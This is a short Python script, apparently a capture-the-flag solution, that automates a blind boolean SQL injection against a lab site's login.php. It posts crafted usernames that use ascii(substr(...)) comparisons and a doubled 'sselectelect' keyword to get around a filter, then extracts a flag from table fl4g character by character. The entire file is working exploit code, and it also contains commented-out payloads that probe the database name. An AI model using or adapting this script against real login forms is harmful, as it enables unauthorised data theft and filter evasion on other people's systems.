# coding:utf-8

import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
length = 26
name = ''
right = '8bef'
worry = '5728'
url = 'http://eci-2ze34wzgdvr4euywan3t.cloudeci1.ichunqiu.com/login.php'
for j in range(1, length + 1):
    for i in dic:
        # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
        # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
        key = "admin'" + " and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),%d,1))=" % j + str(ord(i)) + ")#"
        data = {'name': key, 'pass': '111'}
        r = requests.post(url, data=data).text
        if right in str(r):
            name += i
            print(name)
